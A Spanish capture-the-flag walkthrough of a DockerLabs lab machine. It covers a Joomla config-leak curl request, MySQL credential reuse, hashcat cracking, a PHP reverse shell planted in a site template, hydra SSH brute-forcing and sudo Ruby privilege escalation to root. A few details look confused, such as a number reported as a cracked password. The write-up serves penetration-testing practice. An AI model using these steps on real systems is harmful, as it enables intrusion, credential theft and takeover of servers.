nmap: 22,80 3306

![image](https://github.com/user-attachments/assets/127b255b-eead-405d-ae0f-217aa3fc6a6b)

---

en la pagina principal hay un apache2 ubuntu, nada interesante tampoco en el código fuente

hacemos un gobuster:

       - # gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -t 20 -x php,html,txt -k

y nos da:

![image](https://github.com/user-attachments/assets/c5162c38-f072-4037-a84a-e6493cb0bd95)

entramos y tenemos pagina

![image](https://github.com/user-attachments/assets/962bf906-35fe-4292-8422-d8fd1704ad92)

en la pagina encontré esto interesante

![image](https://github.com/user-attachments/assets/5c7ed55c-e58f-4781-8a1a-d152f4d59ceb)

*buscar posible explotación:  Joomla 4.0.3*

> exploit encontrado: https://vulncheck.com/blog/joomla-for-rce

![image](https://github.com/user-attachments/assets/50675612-80c8-4071-b29a-581309090f31)

utilizamos joomscan (JoomScan es una herramienta de escaneo de vulnerabilidades diseñada específicamente para aplicaciones web basadas en Joomla. Sirve para identificar posibles vulnerabilidades y debilidades en sitios web que utilizan este popular sistema de gestión de contenido (CMS):

       - joomscan -u http://172.17.0.2/wordpress/

nos da:

![image](https://github.com/user-attachments/assets/61314e6d-2a8b-4e5e-abe1-3f65103725a2)

entramos a los dos de robots.txt y administrador

![image](https://github.com/user-attachments/assets/92a794ae-04b3-419c-bff4-4f517e7cb9e7)

![image](https://github.com/user-attachments/assets/2dbc3100-4fe1-4381-8ea1-8b29038b55de)

buscando también me llamo la atención esto

![image](https://github.com/user-attachments/assets/88ef841f-d5cb-4f34-8ee3-f38719dddb26)

hasta que encontré este comando

     curl -v http://172.17.0.2/wordpress/api/index.php/v1/config/application?public=true

y me dio las credenciales

![image](https://github.com/user-attachments/assets/9105f3c8-586f-48cb-85e7-09a41d13ac72)

usuario: joomla_user
contraseña: vuln

probé en el login que teníamos en administrator, pero no funciono así que probé con la base de datos  

revisamos una posible base de datos con los usuarios encontrados:

      - mysql -h 172.17.0.2 -u joomla_user -pvuln

entramos a "mysql none":

     show databases; 

![image](https://github.com/user-attachments/assets/f8d28e70-b8ea-405c-a017-ab7bcc4a3733)

    use joomla_db
    show tables

![image](https://github.com/user-attachments/assets/610fc7fc-564a-4302-9f9b-e00df1af7c48)


    select * from ffsnq_users;

nos da una contraseña encriptada:

![image](https://github.com/user-attachments/assets/676d66ed-15cc-43de-984c-c8c6412ba7c4)


utilizamos: https://hashes.com/en/decrypt/hash

       - $2y$10$UVmUci/wKgu7LFir7KIzP.NDup3lYDUxPzz7WZryvEYVdUjUVhou.
       - contraseña: bcrypt

creamos un archivo con la contraseña encriptada llamado "hash.txt"

en el terminal:
      
    hashcat -m 3200 hast.txt /usr/share/wordlists/rockyou.txt
    
nos da otra contraseña: 14344392
también nos da posible contraseña: tequieromucho

credenciales para admin:

      - firstatack
      - tequieromucho

vamos al login e ingresamos

![image](https://github.com/user-attachments/assets/aa06ac02-5ece-4d63-9e0c-56f8ed2117ea)

luego buscando en la pagina como admin vamos a:

> system > site templates > click en la pagina > index.php y cargamos un código php 

para conectarnos: https://github.com/pentestmonkey/php-reverse-shell
cambiamos IP y puerto: lo guardamos y en otra pestaña abrimos con la IP de la pagina mientras tenemos en escucha nuestro puerto 443, y entramos.
![[dockerlabs/dificil/vulnerame/conexion.png]]

luego de cargar en index.php la reverse la cargamos en el URL con el terminal en escucha

> http://172.17.0.2/wordpress/index.php?cmd=cat%20/etc/passwd

hacemos tratamiento de stty y buscamos como escalar.

dentro hay dos usuarios: guadalupe e ignacio y hacemos un ataque de fuerza bruta:

     hydra -l ignacio -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64

     hydra -l guadalupe -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64

![[dockerlabs/dificil/vulnerame/hydra.png]]

y tenemos la contraseña de ambos usuarios. con el que podemos escalar es con ignacio

![[dockerlabs/dificil/vulnerame/sudo -l.png]]

ya dentro del usuario Ignacio podemos ejecutar los "nano" así que modificamos el archivo "saludos.rb": 


      sudo /usr/bin/saludos.rb

         - exec "/bin/sh"
         - system "/bin/sh"

ejecutamos 

     sudo /usr/bin/ruby /usr/bin/saludos.rb

![[dockerlabs/dificil/vulnerame/root.png]]

y somos root! 
